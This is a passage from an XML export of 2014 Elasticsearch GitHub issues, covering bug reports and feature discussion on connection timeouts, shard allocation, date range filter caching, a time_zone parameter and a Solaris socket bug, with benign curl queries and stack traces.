    status, headers, data = connection.perform_request(method, url, params, body, ignore=ignore, timeout=timeout)
  File "/usr/local/lib/python2.7/dist-packages/elasticsearch/connection/http_urllib3.py", line 51, in perform_request
    raise ConnectionError('N/A', str(e), e)
elasticsearch.exceptions.ConnectionError: ConnectionError(HTTPConnectionPool(host='localhost', port=9200): Read timed out. (read timeout=10)) caused by: ReadTimeoutError(HTTPConnectionPool(host='localhost', port=9200): Read timed out. (read timeout=10))

Process finished with exit code 1
</description><key id="39260653">7118</key><summary>Elastic search throwing connection error when trying to use bulk API to index documents</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">karthikdandavathi</reporter><labels /><created>2014-08-01T04:33:07Z</created><updated>2014-08-01T07:49:57Z</updated><resolved>2014-08-01T07:49:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-01T07:49:57Z" id="50858270">Hi @karthikdandavathi 

Please ask questions like these in the forum.  This issues list is for bug reports and feature requests.  When you mail the forum, I suggest you include the errors that you see in the Elasticsearch logs.  The errors you include here are from the application, and are not terribly helpful.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Local shard initialisation after node restart with disabled allocation doesn't appear to work as expected</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7117</link><project id="" key="" /><description>When doing a rolling restart for an upgrade or other reason, per [the documentation](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/setup-upgrade.html) , allocation is disabled and once the node(s) are back in the cluster allocation is enabled.

However I've noticed and I'm also seeing more and more people comment on the same thing on IRC; shards are not being locally initialised as expected but are being reallocated to other nodes and then initialised.
This obviously slows recovery rather dramatically.

Given I don't have anything solid to back this up beyond anecdata, I am hoping I can kick off a discussion around what sort of data could be collected to try and confirm/deny this.
</description><key id="39255920">7117</key><summary>Local shard initialisation after node restart with disabled allocation doesn't appear to work as expected</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">markwalkom</reporter><labels><label>docs</label></labels><created>2014-08-01T02:05:00Z</created><updated>2014-11-08T13:23:56Z</updated><resolved>2014-11-08T13:23:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-01T07:46:40Z" id="50858023">/cc @dakrone something to do with the deciders perhaps?
</comment><comment author="markwalkom" created="2014-08-07T06:50:42Z" id="51437064">I'm in a position where I need to reboot one of our nodes in our largest cluster, running 1.2.1.

Is there anything that I can watch or logging I can provide while this is underway to help diagnose?
</comment><comment author="clintongormley" created="2014-08-07T12:41:15Z" id="51465832">@markwalkom shard movements will be logged, so if you find that disabling allocation doesn't work as expected, then those logs would be helpful.
</comment><comment author="markwalkom" created="2014-08-08T07:32:36Z" id="51571444">Here's a mailing list example - https://groups.google.com/d/msgid/elasticsearch/87b642e8-0f80-487b-8634-321fa2f3cb42%40googlegroups.com?utm_medium=email&amp;utm_source=footer

The documentation is correct in that the local indices (shards?) are intact, but they are not being reinitialisedas you'd expect.
</comment><comment author="markwalkom" created="2014-08-12T00:50:15Z" id="51860706">Another mailing list example - https://groups.google.com/d/msgid/elasticsearch/a7c8a15b-3e74-4c38-ab03-ff3e7d6fcd32%40googlegroups.com?utm_medium=email&amp;utm_source=footer

I haven't yet rebooted my node to be able to get logging sorry.
</comment><comment author="clintongormley" created="2014-08-12T08:06:05Z" id="51884963">@markwalkom from the two posts that you have linked to, there just seems to be misunderstanding of how things work rather than an actual problem.

Will see how we can improve the wording to make things clearer.
</comment><comment author="clintongormley" created="2014-11-08T13:23:55Z" id="62257568">Closed by #8218
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>actionGet unusually long execution time in javaclient, but same curl command returns in 5 seconds</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7116</link><project id="" key="" /><description>We built out a search query using the javaclient (used from within Scala).
If we run
logger.debug(searchBuilder.toString)

We take the exact query sent via the java client in a curl command.

The curl command returns 15000 rows in 4 seconds (I realize 15000 is alot, but it works consistently, 100% in curl, and 100% of the time in the python client).  

In the java client, if we wrap a timer around the actionGet call, we see it takes 125 seconds.
The client making the call is the same for the java code, python script and the curl command.
The remote elasticsearch index is on a server, a separate server, which doesn't have any errors.
I am wondering what we may need to look at in java application so that is on par with the speedy 4 to 5 second results we see in curl and python.

this is a representation of the curl command

```
curl -XGET 'http://10.x.x.x:9200/ourindex/post/_search' -d '
{   
  "from" : 0,
  "size" : 15000,
  "query" : {
    "bool" : {
      "must" : [ {
        "range" : {
          "created_at" : {
            "from" : "now-1000d",
            "to" : "now",
            "include_lower" : true,
            "include_upper" : true
          }
        }
      }, {
        "match" : {
          "userid" : {
            "query" : "53cff1973dc82e39b00000a8",
            "type" : "boolean"
          }
        }
      } ],
      "minimum_should_match" : "0"
    }
  },
  "sort" : [ {
    "created_at" : {
      "order" : "desc"
    }
  } ],
  "track_scores" : true
}'
```

compared to ----

this in java - when we inspect the string it creates, essentially is:
mybulder.setSearchType(SearchType.QUERY_THEN_FETCH)
... other builder code ...
mybuilder.execute.actionGet

```
{   
  "from" : 0,
  "size" : 15000,
  "query" : {
    "bool" : {
      "must" : [ {
        "range" : {          "created_at" : {
            "from" : "now-1000d",
            "to" : "now",
            "include_lower" : true,
            "include_upper" : true
          }
        }
      }, {
        "match" : {
          "userid" : {
            "query" : "53cff1973dc82e39b00000a8",
            "type" : "boolean"
          }
        }
      } ],
      "minimum_should_match" : "0"
    }
  },
  "sort" : [ {
    "created_at" : {
      "order" : "desc"
    }
  } ],
  "track_scores" : true
}
```
</description><key id="39248949">7116</key><summary>actionGet unusually long execution time in javaclient, but same curl command returns in 5 seconds</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jeffsteinmetz</reporter><labels><label>discuss</label></labels><created>2014-07-31T23:29:13Z</created><updated>2014-08-01T16:07:42Z</updated><resolved>2014-08-01T16:07:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>On Solaris 10 (Illumos), setting TCP_NODELAY on a closed socket causes elasticsearch to be unresponsive</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7115</link><project id="" key="" /><description>We're on ElasticSearch 1.1.1 running on Illumos (Solaris 10 derivative on Joyent).

We ran into an issue today where elasticsearch became completely unresponsive after the following exception:

```
[2014-07-31 12:30:18,081][WARN ][monitor.jvm              ] [HOSTNAME] [gc][young][3604571][140866] duration [1.9s], collections [1]/[2.2s], total [
1.9s]/[1.2h], memory [22.7gb]-&gt;[21.4gb]/[29.1gb], all_pools {[young] [1.3gb]-&gt;[29.2mb]/[1.4gb]}{[survivor] [70mb]-&gt;[55.3mb]/[191.3mb]}{[old] [21.3gb]-&gt;[21.3
gb]/[27.4gb]}
[2014-07-31 12:30:27,075][WARN ][monitor.jvm              ] [HOSTNAME] [gc][young][3604579][140869] duration [1.2s], collections [1]/[1.9s], total [
1.2s]/[1.2h], memory [22.3gb]-&gt;[21.2gb]/[29.1gb], all_pools {[young] [1.1gb]-&gt;[29.8mb]/[1.4gb]}{[survivor] [52.9mb]-&gt;[46.8mb]/[191.3mb]}{[old] [21.2gb]-&gt;[21
.2gb]/[27.4gb]}
[2014-07-31 12:30:35,954][WARN ][http.netty               ] [HOSTNAME] Caught exception while handling client http traffic, closing connection [id:
0x810b66dd, /IPSOURCE:48650 =&gt; /IPDEST:9200]
org.elasticsearch.common.netty.channel.ChannelException: java.net.SocketException: Invalid argument
        at org.elasticsearch.common.netty.channel.socket.DefaultSocketChannelConfig.setTcpNoDelay(DefaultSocketChannelConfig.java:178)
        at org.elasticsearch.common.netty.channel.socket.DefaultSocketChannelConfig.setOption(DefaultSocketChannelConfig.java:54)
        at org.elasticsearch.common.netty.channel.socket.nio.DefaultNioSocketChannelConfig.setOption(DefaultNioSocketChannelConfig.java:70)
        at org.elasticsearch.common.netty.channel.DefaultChannelConfig.setOptions(DefaultChannelConfig.java:36)
        at org.elasticsearch.common.netty.channel.socket.nio.DefaultNioSocketChannelConfig.setOptions(DefaultNioSocketChannelConfig.java:54)
        at org.elasticsearch.common.netty.bootstrap.ServerBootstrap$Binder.childChannelOpen(ServerBootstrap.java:399)
        at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:77)
        at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
        at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
        at org.elasticsearch.common.netty.channel.Channels.fireChildChannelStateChanged(Channels.java:541)
        at org.elasticsearch.common.netty.channel.Channels.fireChannelOpen(Channels.java:167)
        at org.elasticsearch.common.netty.channel.socket.nio.NioAcceptedSocketChannel.&lt;init&gt;(NioAcceptedSocketChannel.java:42)
        at org.elasticsearch.common.netty.channel.socket.nio.NioServerBoss.registerAcceptedChannel(NioServerBoss.java:137)
        at org.elasticsearch.common.netty.channel.socket.nio.NioServerBoss.process(NioServerBoss.java:104)
        at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
        at org.elasticsearch.common.netty.channel.socket.nio.NioServerBoss.run(NioServerBoss.java:42)
        at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
        at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:744)
Caused by: java.net.SocketException: Invalid argument
        at sun.nio.ch.Net.setIntOption0(Native Method)
        at sun.nio.ch.Net.setSocketOption(Net.java:373)
        at sun.nio.ch.SocketChannelImpl.setOption(SocketChannelImpl.java:189)
        at sun.nio.ch.SocketAdaptor.setBooleanOption(SocketAdaptor.java:295)
        at sun.nio.ch.SocketAdaptor.setTcpNoDelay(SocketAdaptor.java:330)
        at org.elasticsearch.common.netty.channel.socket.DefaultSocketChannelConfig.setTcpNoDelay(DefaultSocketChannelConfig.java:176)
        ... 20 more
```

On solaris, setsocketopt has different behavior that on other platforms. It will return EINVAL causing java to raise an InvalidArgument exception when the socket has been closed. Apparently this happens when the client closes the connection before the server has finished it's accept. Elasticsearch appears to have been doing a garbage collection around that time.

Here's a couple references to this bug occurring in other projects:

http://bugs.java.com/view_bug.do?bug_id=6378870
https://java.net/jira/browse/GLASSFISH-5342
https://jira.atlassian.com/browse/STASH-3624

It also appears that in Netty 4.0+ this might have been fixed by: https://github.com/netty/netty/commit/39357f3835f971e6cc1a0e41a805fa1293e7005e#diff-dbfa6a222217d4fc2c12d20ee3496eb3R50

Unfortunately, this is a bit difficult to reproduce and it only happens rarely. I'd imagine it can by reproduced by running elasticsearch on Solaris 10, finding a way to stall the server long enough for the client to close the connection before the server has set the socket options. Elasticsearch search should then stall and stop responding to any requests (as is the behavior that we saw).

Thanks,
Paul
</description><key id="39237075">7115</key><summary>On Solaris 10 (Illumos), setting TCP_NODELAY on a closed socket causes elasticsearch to be unresponsive</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/kimchy/following{/other_user}', u'events_url': u'https://api.github.com/users/kimchy/events{/privacy}', u'organizations_url': u'https://api.github.com/users/kimchy/orgs', u'url': u'https://api.github.com/users/kimchy', u'gists_url': u'https://api.github.com/users/kimchy/gists{/gist_id}', u'html_url': u'https://github.com/kimchy', u'subscriptions_url': u'https://api.github.com/users/kimchy/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/41300?v=4', u'repos_url': u'https://api.github.com/users/kimchy/repos', u'received_events_url': u'https://api.github.com/users/kimchy/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/kimchy/starred{/owner}{/repo}', u'site_admin': False, u'login': u'kimchy', u'type': u'User', u'id': 41300, u'followers_url': u'https://api.github.com/users/kimchy/followers'}</assignee><reporter username="">f3nry</reporter><labels><label>bug</label></labels><created>2014-07-31T20:59:16Z</created><updated>2014-08-02T20:55:34Z</updated><resolved>2014-08-02T20:55:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-07-31T21:09:42Z" id="50819078">seems like on netty its not set by default only on Android, and still being set on Solaris. I would be more than happy to create a change to disable it on Solaris, others, thoughts?
</comment><comment author="f3nry" created="2014-07-31T21:17:12Z" id="50819920">@kimchy Correct, though it is now wrapped in an exception block and is ignored if it throws an error. TCP_NODELAY should still be set on Solaris but the behavior on a closed socket throws an exception and should be ignored.
</comment><comment author="kimchy" created="2014-07-31T21:23:48Z" id="50820711">Yes, the silent ignore in the exception... . I was just wondering why netty didn't disable it on Solaris by default as well. Based on your input, it seems like it should. I am reaching out to some solaris experts on our end to see what they think, just to be double sure we should make this change. Thanks for bringing it up!
</comment><comment author="f3nry" created="2014-07-31T21:28:18Z" id="50821282">Okay, awesome! Thanks so much!
</comment><comment author="kimchy" created="2014-07-31T21:32:04Z" id="50821758">@letuboy btw, which Java version are you running?
</comment><comment author="kimchy" created="2014-07-31T21:35:10Z" id="50822114">and another question, if you set it to `false`, does that happen (still gathering info, can probably find out on my own as well)? Its just the mere fact of calling `setTcpNoDelay`? If so, then we need not to set this setting at all on solaris, and at the very least, provide another setting to not set it (or another option, call it "default" to leave it as is)
</comment><comment author="f3nry" created="2014-07-31T23:32:13Z" id="50832346">We're using OpenJDK 1.7.

```
openjdk version "1.7.0-internal"
OpenJDK Runtime Environment (build 1.7.0-internal-pkgsrc_2014_05_16_23_21-b00)
OpenJDK 64-Bit Server VM (build 24.51-b03, mixed mode)
```

It appears that the mere fact of calling `setTcpNoDelay` causes this. It's also very rare, but it has happened a few times.
</comment><comment author="kimchy" created="2014-08-02T14:59:02Z" id="50964939">@letuboy hard to tell exactly which Java version its actually is..., internal?
</comment><comment author="kimchy" created="2014-08-02T15:34:51Z" id="50965875">I pushed #7136 to master and 1.x (upcoming 1.4) to allow to set `default` as the value, and then it will not be set. Its not a good out of the box solution, but at least now users will have the option to configure ES not to set it at all.
</comment><comment author="f3nry" created="2014-08-02T20:55:34Z" id="50974086">OpenJDK 1.7 correlates to Java 7, as far as I'm aware of. Thanks so much! We'll look out for the 1.4 release and update the setting when that happens. This issue is rare, so it shouldn't be too much of an pain until then. I'll close this ticket.

@sax @indirect
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Query DSL: Cache range filter on date field by default</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7114</link><project id="" key="" /><description>A range filter on a date field with a numeric `from`/`to` value is **not** cached by default:

```
DELETE /test 

PUT /test/t/1
{
  "date": "2014-01-01"
}

GET /_validate/query?explain
{
  "query": {
    "filtered": {
      "filter": {
        "range": {
          "date": {
            "from": 0
          }
        }
      }
    }
  }
}
```

Returns:

```
"explanation": "ConstantScore(no_cache(date:[0 TO *]))"
```
</description><key id="39225027">7114</key><summary>Query DSL: Cache range filter on date field by default</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>bug</label><label>v1.2.4</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-31T18:48:12Z</created><updated>2014-08-12T14:47:17Z</updated><resolved>2014-08-12T14:40:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-07-31T18:54:43Z" id="50802759">Indeed, in `DateFieldMapper`:

``` java
        if (lowerTerm != null) {
            if (lowerTerm instanceof Number) {
                lowerVal = ((Number) lowerTerm).longValue();
            } else {
                String value = convertToString(lowerTerm);
                cache = explicitCaching || !hasNowExpressionWithNoRounding(value);
                lowerVal = parseToMilliseconds(value, context, false);
            }
        }
        if (upperTerm != null) {
            if (upperTerm instanceof Number) {
                upperVal = ((Number) upperTerm).longValue();
            } else {
                String value = convertToString(upperTerm);
                cache = explicitCaching || !hasNowExpressionWithNoRounding(value);
                upperVal = parseToMilliseconds(value, context, includeUpper);
            }
        }
```
</comment><comment author="dadoonet" created="2014-08-06T16:16:21Z" id="51358575">While looking at this issue, I found that if you use a `now` as the `from` value and a constant value as `to`, the range is cached although I think it should not:

```
DELETE /test 

PUT /test/t/1
{
  "date": "2014-01-01"
}

GET /test/_validate/query?explain
{
  "query": {
    "filtered": {
      "filter": {
        "range": {
          "date": {
            "from": "now",
            "to":"now/d+d"
          }
        }
      }
    }
  }
}
```

gives:

```
"explanations": [
      {
         "index": "test",
         "valid": true,
         "explanation": "ConstantScore(cache(date:[1407341732658 TO 1407456000000]))"
      }
   ]
```

@clintongormley Do you agree that this should be fixed as well?
</comment><comment author="clintongormley" created="2014-08-07T12:24:58Z" id="51464343">@dadoonet yes i do
</comment><comment author="dadoonet" created="2014-08-07T22:09:14Z" id="51539152">Here are the results of my findings so far (test agains master branch so before applying PR #7122):

I created a range filter like this:

``` js
{
    "constant_score" : {
        "filter" : {
            "range" : {
                "born" : {
                    "gte": &lt;GTE&gt;,
                    "lte": &lt;LTE&gt;
                },
                "_cache" : &lt;CACHE IF NOT NULL&gt;
            }
        }
    }
}
```

## Failures

The most critical ones performance wise are:

```
[WARN ] gte [null], lte [1577836800], _cache [null] should be cached
[WARN ] gte [1325376000], lte [null], _cache [null] should be cached
[WARN ] gte [1325376000], lte [1577836800], _cache [null] should be cached
[WARN ] gte [now], lte [2012-01-01], _cache [null] should not be cached
```

Those are minor issues performance wise.

```
[WARN ] gte [now/d], lte [null], _cache [false] should not be cached
[WARN ] gte [null], lte [now/d], _cache [false] should not be cached
[WARN ] gte [now/d], lte [now/d], _cache [false] should not be cached
[WARN ] gte [2012-01-01], lte [null], _cache [false] should not be cached
[WARN ] gte [null], lte [2012-01-01], _cache [false] should not be cached
[WARN ] gte [2012-01-01], lte [2012-01-01], _cache [false] should not be cached
[WARN ] gte [now], lte [2012-01-01], _cache [false] should not be cached
[WARN ] gte [2012-01-01], lte [now/d], _cache [false] should not be cached
[WARN ] gte [now/d], lte [2012-01-01], _cache [false] should not be cached
[WARN ] gte [1325376000], lte [now/d], _cache [false] should not be cached
[WARN ] gte [now/d], lte [1577836800], _cache [false] should not be cached
```

Extreme use case: I don't know if we should cache or not this one. It produces a range filter: `born:[* TO *]`. Should this be cached? @clintongormley WDYT?

```
[WARN ] gte [null], lte [null], _cache [null] should be cached
```

## Passing tests

For information, here are the successful tests:

```
[INFO ] gte [null], lte [null], _cache [true] is cached
[INFO ] gte [null], lte [null], _cache [false] is not cached
[INFO ] gte [now], lte [null], _cache [null] is not cached
[INFO ] gte [null], lte [now], _cache [null] is not cached
[INFO ] gte [now], lte [now], _cache [null] is not cached
[INFO ] gte [now/d], lte [null], _cache [null] is cached
[INFO ] gte [null], lte [now/d], _cache [null] is cached
[INFO ] gte [now/d], lte [now/d], _cache [null] is cached
[INFO ] gte [2012-01-01], lte [null], _cache [null] is cached
[INFO ] gte [null], lte [2012-01-01], _cache [null] is cached
[INFO ] gte [2012-01-01], lte [2012-01-01], _cache [null] is cached
[INFO ] gte [2012-01-01], lte [now], _cache [null] is not cached
[INFO ] gte [2012-01-01], lte [now/d], _cache [null] is cached
[INFO ] gte [now/d], lte [2012-01-01], _cache [null] is cached
[INFO ] gte [now], lte [1577836800], _cache [null] is not cached
[INFO ] gte [1325376000], lte [now], _cache [null] is not cached
[INFO ] gte [1325376000], lte [now/d], _cache [null] is cached
[INFO ] gte [now/d], lte [1577836800], _cache [null] is cached
[INFO ] gte [now], lte [null], _cache [true] is cached
[INFO ] gte [null], lte [now], _cache [true] is cached
[INFO ] gte [now], lte [now], _cache [true] is cached
[INFO ] gte [now/d], lte [null], _cache [true] is cached
[INFO ] gte [null], lte [now/d], _cache [true] is cached
[INFO ] gte [now/d], lte [now/d], _cache [true] is cached
[INFO ] gte [2012-01-01], lte [null], _cache [true] is cached
[INFO ] gte [null], lte [2012-01-01], _cache [true] is cached
[INFO ] gte [2012-01-01], lte [2012-01-01], _cache [true] is cached
[INFO ] gte [now], lte [2012-01-01], _cache [true] is cached
[INFO ] gte [2012-01-01], lte [now], _cache [true] is cached
[INFO ] gte [2012-01-01], lte [now/d], _cache [true] is cached
[INFO ] gte [now/d], lte [2012-01-01], _cache [true] is cached
[INFO ] gte [null], lte [1577836800], _cache [true] is cached
[INFO ] gte [1325376000], lte [null], _cache [true] is cached
[INFO ] gte [1325376000], lte [1577836800], _cache [true] is cached
[INFO ] gte [now], lte [1577836800], _cache [true] is cached
[INFO ] gte [1325376000], lte [now], _cache [true] is cached
[INFO ] gte [1325376000], lte [now/d], _cache [true] is cached
[INFO ] gte [now/d], lte [1577836800], _cache [true] is cached
[INFO ] gte [now], lte [null], _cache [false] is not cached
[INFO ] gte [null], lte [now], _cache [false] is not cached
[INFO ] gte [now], lte [now], _cache [false] is not cached
[INFO ] gte [2012-01-01], lte [now], _cache [false] is not cached
[INFO ] gte [null], lte [1577836800], _cache [false] is not cached
[INFO ] gte [1325376000], lte [null], _cache [false] is not cached
[INFO ] gte [1325376000], lte [1577836800], _cache [false] is not cached
[INFO ] gte [now], lte [1577836800], _cache [false] is not cached
[INFO ] gte [1325376000], lte [now], _cache [false] is not cached
```
</comment><comment author="clintongormley" created="2014-08-08T07:01:51Z" id="51569561">&gt; Extreme use case: I don't know if we should cache or not this one. It produces a range filter: born:[\* TO *]. Should this be cached? @clintongormley WDYT?

This should be rewritten as a match_all filter instead.
</comment><comment author="dadoonet" created="2014-08-08T14:40:45Z" id="51610778">After talking with @martijnvg and @clintongormley, I changed the test scenario. 
Basically, even if user explicitly choose to cache a filter which contains `now`, we don't cache it.

Here are new list of failing tests:

```
[WARN ][org.elasticsearch.index.query] gte [now], lte [2012-01-01], _cache [null] should not be cached
[WARN ][org.elasticsearch.index.query] gte [null], lte [1577836800], _cache [null] should be cached
[WARN ][org.elasticsearch.index.query] gte [1325376000], lte [null], _cache [null] should be cached
[WARN ][org.elasticsearch.index.query] gte [1325376000], lte [1577836800], _cache [null] should be cached
[WARN ][org.elasticsearch.index.query] gte [now], lte [null], _cache [true] should not be cached
[WARN ][org.elasticsearch.index.query] gte [null], lte [now], _cache [true] should not be cached
[WARN ][org.elasticsearch.index.query] gte [now], lte [now], _cache [true] should not be cached
[WARN ][org.elasticsearch.index.query] gte [now], lte [2012-01-01], _cache [true] should not be cached
[WARN ][org.elasticsearch.index.query] gte [2012-01-01], lte [now], _cache [true] should not be cached
[WARN ][org.elasticsearch.index.query] gte [now], lte [1577836800], _cache [true] should not be cached
[WARN ][org.elasticsearch.index.query] gte [1325376000], lte [now], _cache [true] should not be cached
```

About:

&gt; Extreme use case: I don't know if we should cache or not this one. It produces a range filter: born:[\* TO *]. 

#7204 is opened for that.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add time zone setting for relative date math in range filter/query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7113</link><project id="" key="" /><description>Filters and Queries now supports `time_zone` parameter which defines which time zone should be applied to the query or filter to convert it to UTC time based value.

When applied on `date` fields the `range` filter and queries accept also a `time_zone` parameter.

The `time_zone` parameter will be applied to your input lower and upper bounds and will move them to UTC time based date:

``` js
{
    "constant_score": {
        "filter": {
            "range" : {
                "born" : {
                    "gte": "2012-01-01",
                    "lte": "now",
                    "time_zone": "+1:00"
                }
            }
        }
    }
}

{
    "range" : {
        "born" : {
            "gte": "2012-01-01",
            "lte": "now",
            "time_zone": "+1:00"
        }
    }
}
```

In the above examples, `gte` will be actually moved to `2011-12-31T23:00:00` UTC date.

NOTE: if you give a date with a timezone explicitly defined and use the `time_zone` parameter, `time_zone` will be
ignored. For example, setting `from` to `2012-01-01T00:00:00+01:00` with `"time_zone":"+10:00"` will still use `+01:00` time zone.

Closes #3729.
</description><key id="39217400">7113</key><summary>Add time zone setting for relative date math in range filter/query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:Query DSL</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-31T17:27:18Z</created><updated>2015-06-07T12:31:55Z</updated><resolved>2014-08-04T13:43:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-01T10:17:53Z" id="50869551">Instead of always moving the time after the date is parser, maybe we should rather configure the parser to use the provided time zone as a default, ie. when a timezone is not already provided in the date? This way, dates that are explicit about the timezone, eg.
- "2012-04-21T18:25:43-05:00" 
- "2012-04-23T18:25:43.511Z"

would not be moved, while dates that don't specify a timezone, eg.
- "2012-01-01"
  would be moved?

This seems to be possible by replacing `parser.parseMillis(date);` with `parser.withZone(timeZone).parseMillis(date);` (didn't try).

I think we should not try to move numbers of milliseconds since Epoch either, since Epoch is the same instant on all timezones.
</comment><comment author="dadoonet" created="2014-08-01T15:41:23Z" id="50899325">@jpountz PR updated
</comment><comment author="dadoonet" created="2014-08-01T16:04:53Z" id="50902310">@jpountz Updated :)
</comment><comment author="jpountz" created="2014-08-04T07:41:56Z" id="51026590">@dadoonet Just played with the pull request, seems to work fine. I left a couple of minor comments but other than that it looks good to me!
</comment><comment author="dadoonet" created="2014-08-04T13:02:07Z" id="51056325">@jpountz thanks for the comments. Just updated my branch.

I'll rebase on master and run the full tests again.

Do you think it should go in other branch than master and 1.4?
</comment><comment author="jpountz" created="2014-08-04T13:04:07Z" id="51056628">+1 to push, this looks great!

&gt; Do you think it should go in other branch than master and 1.4?

master and 1.4 sound good to me. This is a new feature, so it doesn't really make sense to push it to older branches.
</comment><comment author="dadoonet" created="2014-08-04T13:24:37Z" id="51058999">I guess I need to update doc with a "coming in 1.4" :)
</comment><comment author="dadoonet" created="2014-08-04T13:43:40Z" id="51061216">pushed in master (873a45e) and 1.x (2c0db1f)
</comment><comment author="mewwts" created="2015-02-23T11:29:12Z" id="75526367">Hi, I've opened #9814 because I can't seem to get this to work with rounding in date math. Is this expected behaviour?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Incorrect field values returned when '.' (dot) used in property name</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7112</link><project id="" key="" /><description>If two properties in a document have the same prefix up to a '.' (dot/period), then queries for the fields that include the '.' will return the same value as the prefix without.

``` bash
#Delete Test Index
curl -XDELETE localhost:9200/test

#Create a document with property names similar up to a '.'
curl -XPUT http://localhost:9200/test/test/1 -d '
{
  "foo" : "val",
  "foo.bar" : "val_WILL_NOT_SHOW",
  "foo.bat" : "val_THIS_EITHER"
